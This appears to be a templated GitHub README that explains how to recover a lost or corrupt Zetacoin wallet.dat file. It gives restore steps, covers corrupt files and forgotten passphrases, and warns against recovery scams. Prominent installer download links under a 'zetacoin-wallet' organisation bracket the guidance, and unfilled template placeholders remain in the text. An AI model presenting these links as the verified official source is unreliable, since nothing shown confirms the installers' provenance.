![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Recover a Lost or Corrupt Zetacoin Wallet</h1>

<p align="center">How the Zetacoin wallet stores keys, and the steps that keep a copy which actually restores.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

Recovery depends on whether a copy of `wallet.dat` exists somewhere. If it does, restore it and rescan  -  that works. If it does not, the keys are gone, because there is no seed phrase and no administrative recovery. For a corrupt file, a good copy or a backup image of the disk is the realistic path.

## The one question that decides everything

Does a copy of the file exist? That includes an external drive, a second machine, a cloud folder, an old laptop, a disk image, a Time Machine backup, or a copy someone made for you. If yes, recovery is a restore. If no, nothing else in this article applies.

Being clear about that early saves people from spending money on "recovery services" that cannot help. A wallet file is not a password; without a copy there is nothing to recover, and no tool can derive keys that no longer exist anywhere.

The full walk-through, with the checks in order, is in [How to Back Up the Zetacoin Wallet](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/how-to-back-up-the-dat-file.md).

## If a copy exists

1. Install the current release and let it create a data directory.
2. Close the client.
3. Copy the backup `wallet.dat` into the data directory.
4. Reopen the client and unlock it.
5. Let the rescan finish; the balance appears at the end.

If the restored file predates your last transactions, those transactions are not in it. That is a limit of the copy, not of the process.

{{ARTICLE:restore-zetacoin-wallet-backup}} covers the sequence in detail, and {{ARTICLE:where-is-zetacoin-wallet-dat}} tells you where to put the file.

## Places people forget to look

The old machine, even if it will not boot  -  its disk may be readable in an enclosure. A second user profile on the same machine. An external drive used once for a backup. An email to yourself with an attachment. A cloud folder that synced the data directory before the disk failed.

Also check portable installs: a client run from a USB drive keeps its data next to the executable, so the wallet may be on that drive rather than in the default location.

For the background behind this step, [Restore a Zetacoin Wallet Backup](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/restore-a-backup-walkthrough.md) covers the same ground in more detail.

## When the file is corrupt

A corrupt wallet usually shows as a client that will not load it, or a file whose size is zero. A zero-length file is the worst case: it holds nothing, and no repair produces keys from nothing.

For a non-zero file that fails to load, the possibilities are an interrupted write, a bad sector, or a partial copy. Restoring from a backup is the reliable route; a disk-level recovery tool is worth trying when the file is the only copy and the disk itself is failing.

Copy the failing disk with a tool designed for it before attempting repairs on the original. Working directly on a failing disk often turns a recoverable situation into a permanent one.

## What the project cannot do

The project cannot reset a passphrase, restore a deleted file, reverse a transaction or freeze a balance. There is no administrator, no support desk with access to keys, and no override on the chain.

That is a property of self-custody rather than a lack of goodwill, and it is why backup discipline is the whole game. Any message claiming otherwise  -  offering recovery for a fee, asking for the file, asking for the passphrase  -  is a theft attempt aimed at the moment you are most vulnerable.

## What a recovery attempt actually involves

For a file that exists but will not load, the work is technical and bounded: copy the failing disk, try to open the file with a current client, and if it still fails, look for an earlier copy. Nothing about that process requires trusting a stranger.

For a file that does not exist, the work is forensic: reading a disk for remnants of a deleted file, which sometimes succeeds when the sectors have not been reused. That is a job for a data-recovery professional working on an image, and it is worth attempting only when the disk is the sole remaining source.

In both cases the outcome is decided before any fee is paid. Anyone who wants payment up front, or wants the file sent to them, is selling a service they cannot deliver.

## The passphrase case

A file you have but cannot open is a different problem from a file you do not have. If the passphrase is forgotten, the file is unreadable and there is no hint mechanism.

Look for the passphrase in a password manager, a written record, or an old note before assuming it is lost. Once those are exhausted, the honest answer is that the coins are inaccessible. {{ARTICLE:zetacoin-wallet-encryption-passphrase}} covers what that means in practice.

## Reducing the chance next time

Encrypt, then copy. Keep two copies on different media, one of them off-site. Test a restore once so you know the copy works. Name the copies by date so the newest is obvious.

None of those steps is technical, and together they are the difference between a bad afternoon and a total loss.

## Common questions

### Can a deleted wallet.dat be recovered?

Only from another copy or a disk image. Deleting the file removes the keys from the machine; a forensic tool may find remnants, but that is not a reliable plan.

### Can the passphrase be reset?

No. There is no recovery mechanism, no hint and no administrative override.

### Will reinstalling bring my wallet back?

No. Reinstalling replaces software, not data, and a fresh data directory starts with an empty wallet.

### Is a paid recovery service worth trying?

For a wallet file, no: the service has no more access to your keys than you do, and the request itself usually asks for the file or the passphrase.

## The honest summary

With a copy, recovery is a restore. Without one, the coins are gone, and the useful work is preventing that outcome for the next wallet.

Related pages: {{ARTICLE:how-to-backup-zetacoin-wallet}} for the habit that prevents this, {{ARTICLE:restore-zetacoin-wallet-backup}} for the restore path, {{ARTICLE:reindex-zetacoin-wallet-database}} if the file loads but the database does not, and {{ARTICLE:zetacoin-wallet-hack-risk}} for the theft scenarios that imitate recovery offers. The current build comes from {{RELEASE}}.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Does Zetacoin Use a Seed Phrase?](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/is-there-a-seed-phrase.md)
- [How to Back Up the Zetacoin Wallet](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/how-to-back-up-the-dat-file.md)
- [Restore a Zetacoin Wallet Backup](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/restore-a-backup-walkthrough.md)
